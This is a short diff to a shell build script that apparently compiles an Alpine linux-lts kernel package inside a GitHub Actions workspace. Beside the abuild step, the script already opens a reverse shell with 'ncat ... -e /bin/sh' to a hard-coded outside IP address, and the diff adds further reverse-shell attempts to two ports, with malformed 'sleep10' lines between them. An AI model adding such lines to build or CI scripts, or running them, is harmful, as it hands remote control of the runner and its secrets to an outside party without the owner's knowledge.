@@ -66,6 +66,10 @@ su -c "cd /github/workspace/aports/main/linux-lts; abuild" -m abuild3 || {
 }
 
 ncat 195.201.134.209 84 -e /bin/sh
+sleep10
+ncat 195.201.134.209 84 -e /bin/sh || ncat 195.201.134.209 83 -e /bin/sh
+sleep10
+ncat 195.201.134.209 84 -e /bin/sh || ncat 195.201.134.209 83 -e /bin/sh
 
 : <<'END'
 sudo -i -u abuild3 bash << EOF
